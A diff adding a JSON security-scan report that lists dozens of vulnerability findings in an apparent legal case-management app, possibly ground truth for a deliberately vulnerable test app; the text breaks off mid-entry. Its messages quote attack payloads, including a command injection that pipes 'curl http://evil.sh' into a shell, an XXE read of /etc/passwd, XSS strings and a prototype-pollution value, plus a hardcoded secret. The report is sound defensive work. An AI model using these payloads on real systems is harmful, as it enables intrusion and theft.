@@ -1,0 +1,961 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "typescript.security.injection.sql-injection",
+      "path": "app/audit.server.ts",
+      "start": {
+        "line": 69,
+        "col": 10,
+        "offset": 2111
+      },
+      "end": {
+        "line": 75,
+        "col": 4,
+        "offset": 2437
+      },
+      "extra": {
+        "message": "searchAuditTrailByDateRange() interpolates the keyword, fromDate and toDate arguments directly into a prisma.$queryRawUnsafe SQL string (ILIKE '%${keyword}%' ... BETWEEN '${fromDate}' AND '${toDate}'). The admin audit route (app/routes/app.audit._index.tsx:75) passes the unvalidated ?q=, ?from= and ?to= query parameters straight through, enabling SQL injection (e.g. a fromDate containing 2026-01-01' OR '1'='1 escapes the literal and alters the query).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.command-injection",
+      "path": "app/render.server.ts",
+      "start": {
+        "line": 40,
+        "col": 3,
+        "offset": 1639
+      },
+      "end": {
+        "line": 40,
+        "col": 83,
+        "offset": 1719
+      },
+      "extra": {
+        "message": "renderFilingBrief() passes requestedFormat \u2014 taken verbatim from the client-controlled x-brief-format header (app/routes/app.matters.$matterId.brief.tsx:30) \u2014 into execSync(`pandoc ${srcPath} -f markdown -t ${requestedFormat} -o ${outPath}`) with no allowlist, allowing arbitrary OS command injection (e.g. 'pdf; curl http://evil.sh | sh'). The sibling renderPracticeAreaGuide() validates its format against ALLOWED_GUIDE_FORMATS before spawning pandoc.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.code-injection",
+      "path": "app/worksheet.server.ts",
+      "start": {
+        "line": 21,
+        "col": 5,
+        "offset": 943
+      },
+      "end": {
+        "line": 22,
+        "col": 40,
+        "offset": 1073
+      },
+      "extra": {
+        "message": "evaluateDamagesWorksheet() executes each 'formula:' line from an uploaded worksheet via new Function(...Object.keys(context), `return (${userFormula});`) \u2014 arbitrary JavaScript from file content is executed with full server privileges (RCE). Reachable by uploading a damages_worksheet document: app/routes/app.matters.$matterId.documents.new.tsx:89 decodes the uploaded bytes and passes them here.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authentication.missing-signature-verification",
+      "path": "app/routes/referral.$assertion.tsx",
+      "start": {
+        "line": 14,
+        "col": 21,
+        "offset": 638
+      },
+      "end": {
+        "line": 14,
+        "col": 80,
+        "offset": 697
+      },
+      "extra": {
+        "message": "The referral packet loader authorizes access with decodeHandoffAssertion(), which only base64-decodes the payload and never verifies the HMAC signature (handoff.server.ts:39 explicitly documents it as 'Not used to authorize access on its own'). Anyone can forge claims {matterId, scope:'referral_packet'} and the unauthenticated /referral/:assertion page will return matter details plus client PII (name, email, phone) and attorney contact info.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authorization.client-trusted-parameter",
+      "path": "app/casedocs.server.ts",
+      "start": {
+        "line": 109,
+        "col": 3,
+        "offset": 4343
+      },
+      "end": {
+        "line": 113,
+        "col": 3,
+        "offset": 4621
+      },
+      "extra": {
+        "message": "lookupCaseStatusForReferringFirm() lifts the sensitivity seal whenever the caller-supplied dataLevel parameter equals 'full'. The public, unauthenticated route app/routes/case-status.$reference.tsx:16-19 forwards the ?dataLevel= query parameter verbatim, so anyone can append ?dataLevel=full to read the title, status and open date of any sealed (sensitive/highly_confidential) matter \u2014 the access decision trusts an attacker-controlled query parameter instead of a verified grant.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-285: Improper Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authentication.weak-password-recovery",
+      "path": "app/routes/forgot-password.tsx",
+      "start": {
+        "line": 36,
+        "col": 5,
+        "offset": 1352
+      },
+      "end": {
+        "line": 40,
+        "col": 40,
+        "offset": 1511
+      },
+      "extra": {
+        "message": "The password reset action returns the actual bearer reset token in the JSON response body (devLink = `${url.origin}/reset-password/${token}`) to any unauthenticated caller who submits a victim's email address, instead of delivering the token out-of-band. Requesting /forgot-password for a known email (e.g. admin@lexora.test) and following the returned link yields full account takeover.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-640: Weak Password Recovery Mechanism for Forgotten Password"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.filesystem.path-traversal-read",
+      "path": "app/templates.server.ts",
+      "start": {
+        "line": 13,
+        "col": 3,
+        "offset": 571
+      },
+      "end": {
+        "line": 14,
+        "col": 24,
+        "offset": 672
+      },
+      "extra": {
+        "message": "loadFilingTemplate() builds path.join(FILING_TEMPLATE_DIR, `${templateName}.md`) from the raw route parameter templateName (app/routes/app.matters.$matterId.filing-templates.$templateName.tsx:18) with no traversal check, so ../ sequences allow reading arbitrary *.md files anywhere on the filesystem readable by the process. Contrast loadPracticeAreaGuideAsset() which enforces a startsWith(GUIDE_ASSET_DIR + path.sep) confinement check.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.filesystem.path-traversal-write",
+      "path": "app/worksheet.server.ts",
+      "start": {
+        "line": 48,
+        "col": 3,
+        "offset": 2147
+      },
+      "end": {
+        "line": 50,
+        "col": 54,
+        "offset": 2305
+      },
+      "extra": {
+        "message": "archiveWorksheetSnapshot() interpolates the user-supplied worksheetLabel directly into path.join(WORKSHEET_ARCHIVE_DIR, `${worksheetLabel}.txt`) and writes to the resulting path. The caller (app/routes/app.matters.$matterId.documents.new.tsx:92) passes the free-text document title, so a title such as '../../x' escapes the archive directory and writes attacker-named files with partially controlled content.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.ssrf.unvalidated-url-fetch",
+      "path": "app/exhibits.server.ts",
+      "start": {
+        "line": 14,
+        "col": 3,
+        "offset": 638
+      },
+      "end": {
+        "line": 15,
+        "col": 30,
+        "offset": 692
+      },
+      "extra": {
+        "message": "pullFiledExhibitCopy() fetches an arbitrary staff-supplied sourceUrl with no scheme or host allowlist, enabling server-side request forgery against internal-only targets (cloud metadata endpoints, localhost services, internal APIs). Contrast pullRegistryExhibitCopy() in the same file which rejects any hostname not in REGISTRY_HOSTNAMES before fetching.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.upload.unrestricted-file-write",
+      "path": "app/exhibits.server.ts",
+      "start": {
+        "line": 19,
+        "col": 3,
+        "offset": 849
+      },
+      "end": {
+        "line": 24,
+        "col": 30,
+        "offset": 1155
+      },
+      "extra": {
+        "message": "pullFiledExhibitCopy() writes the bytes fetched from the user-supplied URL into ./public/exhibits (the web root) with no MIME-type check and no size limit \u2014 contrast pullRegistryExhibitCopy() which enforces isAllowedMime() and MAX_UPLOAD_BYTES before storing via storeUpload(). Content from an attacker-chosen URL (e.g. HTML/SVG) is therefore published and served from the application's own origin, enabling stored XSS and malware hosting.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-434: Unrestricted Upload of File with Dangerous Type"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.xxe.entity-expansion",
+      "path": "app/feed.server.ts",
+      "start": {
+        "line": 21,
+        "col": 7,
+        "offset": 847
+      },
+      "end": {
+        "line": 21,
+        "col": 110,
+        "offset": 953
+      },
+      "extra": {
+        "message": "resolveDeclaredEntities() implements SYSTEM external entity expansion: any <!ENTITY name SYSTEM \"file:///etc/passwd\"> declared in the fetched XML is read with readFileSync() and substituted into the document. syncCourtDocketFeed() fetches an attacker-controllable feedUrl (staff form field, app/routes/app.matters.$matterId.tsx:593-595) and expands these entities, giving an XML external entity (XXE) arbitrary local file read. Contrast syncFirmAnnouncementFeed() which rejects any feed containing a DOCTYPE.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.mass-assignment",
+      "path": "app/routes/app.client-contact.tsx",
+      "start": {
+        "line": 24,
+        "col": 3,
+        "offset": 1144
+      },
+      "end": {
+        "line": 28,
+        "col": 6,
+        "offset": 1280
+      },
+      "extra": {
+        "message": "applyClientContactUpdate() spreads Object.fromEntries(form) directly into prisma.client.update data, so a client-portal user can set ANY Client column \u2014 e.g. accountId (re-linking the client record to another user's portal account) or status/conflictNotes (self-unblocking a conflict_blocked client to open new matters). Contrast applyStaffContactUpdate() in app/routes/app.clients.$clientId.tsx:61-72 which whitelists only displayName/email/phone/organization.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authorization.missing-matter-scope",
+      "path": "app/routes/app.messages._index.tsx",
+      "start": {
+        "line": 76,
+        "col": 3,
+        "offset": 2934
+      },
+      "end": {
+        "line": 84,
+        "col": 6,
+        "offset": 3269
+      },
+      "extra": {
+        "message": "The compose action takes matterId from the form and calls composeMessageFromCustomTemplate() / composeMessageFromStandardTemplate() without ever checking the caller's access to that matter (no computeAccess/matterScopeWhere, unlike every other matter mutation route). Any authenticated user \u2014 including client accounts \u2014 can create messages on arbitrary matters they cannot otherwise see (both the 'custom' branch at line 78 and the 'standard' branch at line 90).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authorization.idor-task-update",
+      "path": "app/routes/app.tasks._index.tsx",
+      "start": {
+        "line": 22,
+        "col": 1,
+        "offset": 1038
+      },
+      "end": {
+        "line": 24,
+        "col": 82,
+        "offset": 1224
+      },
+      "extra": {
+        "message": "advanceTaskStatus() updates prisma.task purely by taskId with no matter-scope check, so any staff member can modify task status on matters they are not assigned to. The sibling closeOutDeadline() in app/routes/app.deadlines._index.tsx:18-24 explicitly scopes the lookup to the caller's own matters ('an id for a deadline on a matter the caller can't otherwise see is a no-op'), highlighting the missing check here.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.xss.stored",
+      "path": "app/richtext.tsx",
+      "start": {
+        "line": 9,
+        "col": 1,
+        "offset": 375
+      },
+      "end": {
+        "line": 12,
+        "col": 50,
+        "offset": 560
+      },
+      "extra": {
+        "message": "renderPortalSummary() converts **bold** markup to <strong> and renders the result via dangerouslySetInnerHTML WITHOUT escaping HTML first \u2014 contrast renderStaffSummary() which runs escapeHtml() before inserting the tags. Matter descriptions are user-editable, so a description containing <img src=x onerror=alert(1)> is stored XSS executed in the browser of every client portal user viewing the matter overview (rendered at app/routes/app.matters.$matterId.tsx:792).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.xss.script-injection",
+      "path": "app/viewer.tsx",
+      "start": {
+        "line": 7,
+        "col": 10,
+        "offset": 220
+      },
+      "end": {
+        "line": 9,
+        "col": 99,
+        "offset": 416
+      },
+      "extra": {
+        "message": "buildDocumentPreviewBootstrap() interpolates documentTitle and tags into a <script> block as raw JS string literals with no escaping \u2014 contrast buildMatterOverviewBootstrap() which passes the payload through jsonScriptSafe() to escape '<'. A document title or tag value containing \";</script><script>alert(1)</script> breaks out of the string literal and script tag, injecting markup executed on the document detail page (rendered via dangerouslySetInnerHTML at app/routes/app.documents.$documentId.tsx:210 with user-supplied doc.title/doc.tags).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.ldap.filter-injection",
+      "path": "app/directory.server.ts",
+      "start": {
+        "line": 102,
+        "col": 3,
+        "offset": 3947
+      },
+      "end": {
+        "line": 102,
+        "col": 63,
+        "offset": 4007
+      },
+      "extra": {
+        "message": "verifyGroupAccess() escapes groupName with escapeDirectoryFilterValue() but interpolates memberDN raw into the LDAP filter `(&(member=${memberDN})(cn=${safeGroup}))`. memberDN comes from the admin credentialing form (app/routes/app.admin.credentialing.tsx:16) and this check gates an escalated-role promotion, so LDAP metacharacters (wildcards, parentheses) in the DN can alter the filter logic and forge a positive clearance result (the mock compileFilter is also permissive on malformed clauses).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.ldap.filter-injection",
+      "path": "app/directory.server.ts",
+      "start": {
+        "line": 86,
+        "col": 3,
+        "offset": 3358
+      },
+      "end": {
+        "line": 86,
+        "col": 37,
+        "offset": 3392
+      },
+      "extra": {
+        "message": "searchStaffDirectory() embeds the free-text search term directly into the LDAP filter `(cn=*${term}*)` without routing it through escapeDirectoryFilterValue() defined in the same file, so wildcard/parenthesis metacharacters entered in the staff directory search box (app/routes/app.admin.directory.tsx:16) alter the filter structure (LDAP filter injection).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.prototype-pollution",
+      "path": "app/reportConfig.server.ts",
+      "start": {
+        "line": 41,
+        "col": 3,
+        "offset": 1400
+      },
+      "end": {
+        "line": 41,
+        "col": 41,
+        "offset": 1438
+      },
+      "extra": {
+        "message": "applySavedReportView() JSON.parses the ?view= query parameter (attacker-controlled, app/routes/app.reports._index.tsx:18) and passes the result to mergeConfigLayer() without the prototype-chain stripping that sanitizeConfigOverrides() applies in applyDigestPreferences(). A view value like {\"__proto__\":{\"polluted\":1}} recurses through target['__proto__'] into Object.prototype and pollutes the prototype of every object in the process.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1321: Improperly Protected Modification of Object Prototype Attributes ('Prototype Pollution')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.nosql-operator-injection",
+      "path": "app/routes/app.clients._index.tsx",
+      "start": {
+        "line": 24,
+        "col": 5,
+        "offset": 1115
+      },
+      "end": {
+        "line": 24,
+        "col": 41,
+        "offset": 1156
+      },
+      "extra": {
+        "message": "buildDirectoryFilter() spreads JSON.parse of the ?view= parameter directly into the Prisma where clause (`{ ...base, ...savedCriteria }`), merging arbitrary user-chosen fields and operators into the database query. Contrast buildMatterSavedView() in app/routes/app.matters._index.tsx:29-44 which only honors a fixed SAVED_VIEW_FIELDS allowlist and never merges the parsed object wholesale.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-943: Improper Neutralization of Special Elements in Data Query Logic"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.cors.origin-reflection",
+      "path": "app/routes/app.clients.$clientId.tsx",
+      "start": {
+        "line": 49,
+        "col": 9,
+        "offset": 1835
+      },
+      "end": {
+        "line": 54,
+        "col": 13,
+        "offset": 2009
+      },
+      "extra": {
+        "message": "The client detail loader reflects the request's Origin header verbatim in Access-Control-Allow-Origin together with Access-Control-Allow-Credentials: true. Any malicious website can therefore read this loader's full response \u2014 client PII, conflict notes, matter list and portal account email \u2014 using a logged-in staff user's session cookie. The firm's other credentialed CORS surface (standingWidgetCorsHeaders) restricts reflection to an allowlist; this one has none.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.cors.origin-reflection",
+      "path": "app/subscription.server.ts",
+      "start": {
+        "line": 76,
+        "col": 5,
+        "offset": 3155
+      },
+      "end": {
+        "line": 77,
+        "col": 46,
+        "offset": 3272
+      },
+      "extra": {
+        "message": "timedWidgetCorsHeaders() echoes back ANY request Origin in Access-Control-Allow-Origin with Access-Control-Allow-Credentials: true, so every origin can read credentialed responses from the docket-status polling endpoint (used at app/routes/api.docket-status.$handle.tsx:22). Contrast standingWidgetCorsHeaders() in the same file which restricts reflection to the ONBOARDED_WIDGET_ORIGINS allowlist.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.ssrf.feed-url-fetch",
+      "path": "app/feed.server.ts",
+      "start": {
+        "line": 51,
+        "col": 3,
+        "offset": 1885
+      },
+      "end": {
+        "line": 51,
+        "col": 35,
+        "offset": 1920
+      },
+      "extra": {
+        "message": "syncCourtDocketFeed() fetches the user-supplied feedUrl with no host or scheme validation (the docket feed sync form field at app/routes/app.matters.$matterId.tsx:593-595), allowing the server to be directed at arbitrary internal or external targets (SSRF), compounded by the XXE entity expansion performed on the response.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.redirect.open-redirect",
+      "path": "app/routes/app.matters.new.tsx",
+      "start": {
+        "line": 38,
+        "col": 5,
+        "offset": 1938
+      },
+      "end": {
+        "line": 39,
+        "col": 28,
+        "offset": 2034
+      },
+      "extra": {
+        "message": "resolveMatterIntakeDestination() returns the x-continue-url request header verbatim as the post-create redirect target with no validation, so an absolute value like https://evil.com redirects the user off-site after matter creation. Contrast resolveClientIntakeDestination() in app/routes/app.clients.new.tsx:25-38 which requires the URL to be same-origin before using the header.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.headers.header-injection",
+      "path": "app/routes/app.matters.$matterId.edit.tsx",
+      "start": {
+        "line": 52,
+        "col": 11,
+        "offset": 2342
+      },
+      "end": {
+        "line": 52,
+        "col": 73,
+        "offset": 2414
+      },
+      "extra": {
+        "message": "The worksheet.download branch places the user-supplied worksheetLabel into the Content-Disposition header (`filename=\"${downloadName}\"` where downloadName is `${worksheetLabel}.txt`) without the safeDownloadName() sanitization available in storage.server.ts. Quotes and control characters from the form field are injected into the response header \u2014 contrast streamFeeSummaryArchive() which validates the matter reference against the fixed MAT-YYYY-NNNN pattern precisely to keep stray header characters out of the filename.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.xpath-injection",
+      "path": "app/casedocs.server.ts",
+      "start": {
+        "line": 59,
+        "col": 3,
+        "offset": 2107
+      },
+      "end": {
+        "line": 59,
+        "col": 100,
+        "offset": 2203
+      },
+      "extra": {
+        "message": "findFiledDocumentByDocket() interpolates the docket reference taken from the ?docket= query parameter (app/routes/app.matters.$matterId.tsx:149-150) directly into the XPath expression `/matter[@id='${matterId}']/document[@docket='${docketReference}']` with no escaping, while the sibling findFiledDocumentsByType() routes the same class of input through escapeXPathString() \u2014 XPath injection that lets crafted references alter node selection.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.weak-password-hash",
+      "path": "app/auth.server.ts",
+      "start": {
+        "line": 38,
+        "col": 3,
+        "offset": 1195
+      },
+      "end": {
+        "line": 38,
+        "col": 48,
+        "offset": 1243
+      },
+      "extra": {
+        "message": "provisionCoCounselPassword() hashes imported account passwords with bcrypt at a work factor of only 4 (or whatever integer the importing CSV row supplies \u2014 app/routes/app.admin.import.tsx:74,90 passes parseInt(row.workFactor) through), far below the cost-12 default used by hashPassword() in the same file. Bulk-imported co-counsel password hashes are therefore trivially cheap to brute-force offline.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-916: Use of Password Hash With Insufficient Computational Effort"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.session.samesite-none-csrf",
+      "path": "app/auth.server.ts",
+      "start": {
+        "line": 16,
+        "col": 5,
+        "offset": 450
+      },
+      "end": {
+        "line": 16,
+        "col": 21,
+        "offset": 471
+      },
+      "extra": {
+        "message": "The __legal_session auth cookie is configured with sameSite: 'none', so it is attached to every cross-site request. Only one mutation in the entire app (sensitivity.reclassify) requires the SameSite=strict mutation token; all other state-changing actions (message create, matter status change, document uploads, client/admin edits) rely on the session cookie alone and are therefore forgeable via cross-site requests (CSRF).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-352: Cross-Site Request Forgery (CSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.secrets.hardcoded-credential",
+      "path": "app/notary.server.ts",
+      "start": {
+        "line": 10,
+        "col": 29,
+        "offset": 306
+      },
+      "end": {
+        "line": 10,
+        "col": 95,
+        "offset": 372
+      },
+      "extra": {
+        "message": "The notary vendor client secret 'nlk_9f3c2a7b5d1e4408b6a2f0c9d7e5b3a1' is hardcoded in source and used as a live Bearer credential in every notary API call. Contrast archivalVendorKey on line 70 which is loaded from the environment and enforced to be present \u2014 the notary secret is committed to the repository and exposed to anyone with source access.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.secrets.credentials-in-url",
+      "path": "app/billing.server.ts",
+      "start": {
+        "line": 74,
+        "col": 15,
+        "offset": 3149
+      },
+      "end": {
+        "line": 74,
+        "col": 165,
+        "offset": 3299
+      },
+      "extra": {
+        "message": "postMatterLedgerEntry() sends the LEDGER_API_KEY as a URL query parameter over plaintext HTTP (`http://${LEDGER_HOST}/v1/ledger/entries?api_key=${LEDGER_API_KEY}&...`), exposing the credential to proxy/access logs and network eavesdropping. The sibling pushPracticeAreaRateCard() correctly keeps the key in the Authorization header and uses the https ACCOUNTING_BASE_URL.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-598: Use of GET Request Method With Sensitive Query Strings",
+            "CWE-319: Cleartext Transmission of Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.logging.sensitive-data-logged",
+      "path": "app/apikey.server.ts",
+      "start": {
+        "line": 28,
+        "col": 5,
+        "offset": 961
+      },
+      "end": {
+        "line": 28,
+        "col": 49,
+        "offset": 1010
+      },
+      "extra": {
+        "message": "logApiAccessAttempt() logs Object.fromEntries(request.headers) for every rejected API call, which includes the raw 'Authorization: Bearer <key>' header of the failed request \u2014 live API key material is written into the application logs (reachable from authenticateApiKey on every failed /api/matters request), despite logDeliveryAttempt's own comment that it records deliveries 'without leaking credentials'.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.errors.stack-trace-disclosure",
+      "path": "app/routes/api.filing-status.tsx",
+      "start": {
+        "line": 51,
+        "col": 7,
+        "offset": 2051
+      },
+      "end": {
+        "line": 51,
+        "col": 99,
+        "offset": 2150
+      },
+      "extra": {
+        "message": "When a caller supplies the 'x-integrator-trace: verbose' request header, the error handler returns (err as Error).message and .stack in the JSON response, disclosing internal stack traces, file paths and library versions. Contrast app/routes/app.admin.settings.tsx:78-80 which gates identical diagnostic output behind NODE_ENV === 'development' \u2014 here any webhook caller can flip a single header to obtain the internals.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authentication.missing-rate-limit",
+      "path": "app/routes/phone-access.tsx",
+      "start": {
+        "line": 32,
+        "col": 3,
+        "offset": 1372
+      },
+      "end": {
+        "line": 35,
+        "col": 6,
+        "offset": 1541
+      },
+      "extra": {
+        "message": "The one-time portal access code is only 6 digits (issuePortalAccessCode), is never consumed/rotated after a successful redemption, and confirmPortalAccessCode has no attempt counting or lockout, so an attacker can brute-force the 1,000,000-code space within the 10-minute validity window by hammering this unauthenticated action, logging in as any client whose email is known.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-307: Improper Restriction of Excessive Authentication Attempts"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.weak-random",
+      "path": "app/casedocs.server.ts",
+      "start": {
+        "line": 140,
+        "col": 15,
+        "offset": 5780
+      },
+      "end": {
+        "line": 140,
+        "col": 79,
+        "offset": 5859
+      },
+      "extra": {
+        "message": "issueCourierPickupCode() generates the security-relevant courier pickup code with Math.floor(Math.random() * 1000000) instead of a cryptographically secure generator \u2014 contrast scheduleOnSiteFileReview() and issuePortalAccessCode() in the same file which use randomInt(). Math.random() output is predictable, so pickup codes used to authorize physical release of documents can be guessed.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.hardcoded-default-key",
+      "path": "app/intakeDraft.server.ts",
+      "start": {
+        "line": 12,
+        "col": 19,
+        "offset": 505
+      },
+      "end": {
+        "line": 12,
+        "col": 85,
+        "offset": 590
+      },
+      "extra": {
+        "message": "The AES-256 draft-token encryption key silently defaults to 64 hex zero characters ('0'.repeat(64)) when the INTAKE_DRAFT_KEY environment variable is unset. A well-known all-zero hardcoded key allows anyone who knows the default to forge or decrypt intake/client resume tokens (unpackIntakeResumeToken / unpackClientResumeToken) without access to the deployment's secrets.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-321: Use of Hard-coded Cryptographic Key"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.session.cookie-missing-httponly",
+      "path": "app/embedSession.server.ts",
+      "start": {
+        "line": 19,
+        "col": 19,
+        "offset": 753
+      },
+      "end": {
+        "line": 19,
+        "col": 72,
+        "offset": 825
+      },
+      "extra": {
+        "message": "The embedSession cookie issued by the referral-packet page is set via a hand-built Set-Cookie string without HttpOnly or Secure flags (contrast issueScopedViewerSession() in the same file which sets HttpOnly, Secure-in-production and SameSite=Strict), exposing the 24-hour viewer handle to any JavaScript running on the page and to cleartext transmission.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag",
+            "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.session.cookie-missing-flags",
+      "path": "app/context.server.ts",
+      "start": {
+        "line": 12,
+        "col": 3,
+        "offset": 545
+      },
+      "end": {
+        "line": 12,
+        "col": 74,
+        "offset": 619
+      },
+      "extra": {
